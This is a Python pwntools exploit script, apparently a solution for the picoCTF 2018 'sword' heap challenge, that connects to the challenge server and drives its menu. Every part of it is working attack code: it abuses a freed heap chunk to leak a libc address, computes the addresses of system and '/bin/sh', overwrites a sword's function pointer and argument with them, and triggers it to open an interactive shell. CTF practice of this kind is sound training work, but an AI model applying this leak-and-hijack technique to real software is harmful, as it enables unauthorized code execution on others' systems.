#!/usr/bin/env python

from pwn import *
import re

libc = ELF("./libc.so.6")
#r = process("./sword", env={"LD_PRELOAD": "libc.so.6"})
r = remote("2018shell.picoctf.com", 55713)
#pause()

def forge_sword():
    print("Forge Sword")
    r.sendline("1")
    data = r.recvuntil("7. Quit.\n")
    return re.search("sword index is ([0-9]+).", data).group(1)

def synthesise_two_swords(idx1, idx2):
    print("Synthesise Two Swords")
    r.sendline("2")
    r.recvuntil("What's the index of the first sword?\n")
    r.sendline(str(idx1))
    r.recvuntil("What's the index of the second sword?\n")
    r.sendline(str(idx2))
    r.recvuntil("7. Quit.\n")

def show_sword(idx1):
    print("Show swords")
    r.sendline("3")
    r.recvuntil("What's the index of the sword?\n")
    r.sendline(str(idx1))
    data = r.recvuntil("7. Quit.\n")
    return data

def destroy_sword(idx1):
    print("Destroy sword")
    r.sendline("4")
    r.recvuntil("What's the index of the sword?\n")
    r.sendline(str(idx1))
    r.recvuntil("7. Quit.\n")

def harden_sword(idx1, length, name):
    print("Harden sword")
    r.sendline("5")
    r.recvuntil("What's the index of the sword?\n")
    r.sendline(str(idx1))
    r.recvuntil("What's the length of the sword name?\n")
    r.sendline(str(length))
    r.recvuntil("Plz input the sword name.\n")
    r.sendline(name)
    r.recvuntil("What's the weight of the sword?\n")
    r.sendline("-1")
    r.recvuntil("7. Quit.\n")

def equip_sword(idx1):
    print("Equip sword")
    r.sendline("6")
    r.recvuntil("What's the index of the sword?\n")
    r.sendline(str(idx1))
    r.recvuntil("7. Quit.\n")

r.recvuntil("7. Quit.\n")

forge_sword()
payload = "A"
harden_sword(0, 0x80, payload)

forge_sword()
destroy_sword(0)
forge_sword()

data = show_sword(0)
res = re.search("The name is (.*)\n", data).group(1)
leak = u64(res.ljust(8, "\x00"))
base = leak - 0x3c4b78
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh\x00").next()

print("Leak:", hex(leak))
print("Libc:", hex(base))
print("System:", hex(system))
print("/bin/sh", hex(binsh))

payload = (
    "A" * 8 +
    p64(binsh) +
    p64(system)
)
harden_sword(0, len(payload), payload)

forge_sword()
destroy_sword(0)
forge_sword()

r.sendline("6")
r.recvuntil("What's the index of the sword?\n")
r.sendline("0")

r.interactive()
